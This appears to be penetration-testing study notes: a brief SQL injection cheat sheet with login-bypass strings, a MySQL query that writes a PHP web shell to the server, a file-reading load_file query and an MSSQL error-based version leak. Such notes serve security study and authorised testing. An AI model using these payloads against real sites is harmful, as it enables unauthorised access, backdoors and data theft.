# SQL Injection

## Readings

* [https://github.com/xMilkPowderx/OSCP/blob/master/SQLi.md](https://github.com/xMilkPowderx/OSCP/blob/master/SQLi.md)

## Authentication Bypass

Some programming languages may expect a single SQL record. If so, we need to limit the number of records manually:

```
admin' or 1=1 LIMIT 1;#
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
```

## MariaDB / MySQL

### Code Execution

```
http://target/page.php?param=vuln UNION SELECT 1,2,3,"<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE 'web_server/backdoor.php'
```

### Load File

```
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

## MSSQL

* [https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/](https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/)

### Error-based SQLi

If an error page is displayed, a way to retrieve DB data is through error-based SQLi. Meaning data will be included in the error page.

Example: if a single quote is generating an error, you can enter the following and check if the DB version is included in the error page:

```
',convert(int,@@version))--
```

The payload may need to be adjusted if any syntax error appear.

## Fuzzing

[https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi)
